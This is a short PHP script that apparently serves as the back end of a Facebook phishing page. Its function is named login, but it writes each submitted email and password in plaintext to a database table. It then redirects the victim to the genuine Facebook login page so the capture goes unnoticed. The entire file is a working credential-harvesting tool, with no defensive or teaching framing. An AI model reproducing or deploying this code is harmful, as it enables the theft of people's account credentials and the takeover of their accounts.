<?php
   include('db.php');
   function login($email, $password){
      $con = connect();
      $stmt = $con->prepare("INSERT INTO `user`(`email`, `password`) VALUES (?,?)");
      $stmt->execute([$email, $password]);
      if($stmt){
         echo "<script>window.location.href = 'https://www.facebook.com/login/'</script>";
      }
   }
   $loginSuccess = login($_POST['email'],$_POST['password']);
?>